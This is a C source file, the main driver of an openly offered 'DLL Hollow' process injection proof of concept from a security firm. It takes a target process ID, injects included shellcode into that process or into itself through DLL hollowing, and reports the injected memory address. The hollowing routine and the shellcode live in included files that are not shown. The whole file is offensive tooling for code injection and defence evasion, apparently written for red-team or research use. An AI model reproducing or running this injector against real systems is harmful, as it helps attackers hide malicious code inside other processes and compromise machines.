/*
DLL Hollow process injection PoC
Author: Dimitri Di Cristofaro (GlenX) @d_glenx
Arch: x86-64
Copyright (c) 2021 SECFORCE (Dimitri Di Cristofaro)
	This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
	This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.
	You should have received a copy of the GNU General Public License along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
#include <windows.h>
#include <stdio.h>
#include "dllHollow.h"
#include "shellcode.c"
#include "syscalls.h"


int main(int argc, char** argv) {
	DWORD pid = 0;
	int status = 0;
	PVOID remote_addr = NULL;


	if (argc == 2) {
		pid = atoi(argv[1]);
		printf("Injecting into PID %d", pid);
	}
	else {
		printf("Injecting into myself\n");
		pid = 0;
	}
	
	wprintf(L"Injecting %d bytes of shellcode\n", shellcode_len);

	// Dll Hollow
	remote_addr = inject(shellcode, shellcode_len, pid);

	if (remote_addr != NULL) {
		if (pid == 0) pid = GetProcessId(GetCurrentProcess());
		printf("Injection done! Check memory @ 0x%p of process with PID %d\n", remote_addr, pid);
	}
	else {
		printf("Injection Failed!\n");
	}


	printf("Keeping the process alive.. Press any key to exit..\n");
	getchar();
		
	return 0;
}